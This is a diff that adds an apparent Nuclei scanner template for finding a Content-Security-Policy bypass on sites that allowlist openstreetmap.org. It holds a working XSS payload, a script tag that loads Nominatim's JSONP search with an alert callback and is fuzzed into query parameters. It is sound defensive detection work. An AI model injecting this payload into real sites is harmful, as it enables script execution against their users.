@@ -1,0 +1,55 @@
+id: openstreetmap-nominatim-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - OpenStreetMap Nominatim
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,openstreetmap-nominatim,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "openstreetmap.org"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: openstreetmap_nominatim_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://nominatim.openstreetmap.org/search?q=&format=json&addressdetails=1&polygon_geojson=1&json_callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "openstreetmap_nominatim_csp_xss == true"
+# digest: 4b0a00483046022100fed21bad56b6f09f83e2650a47b15176d4997e40e8cd7346faceb313c0fc0d980221009b8c15e26383141c7fdb71147e32fc2f71c9faf47f2c1b69cbbb36648dea3714:922c64590222798bb761d5b6d8e72950
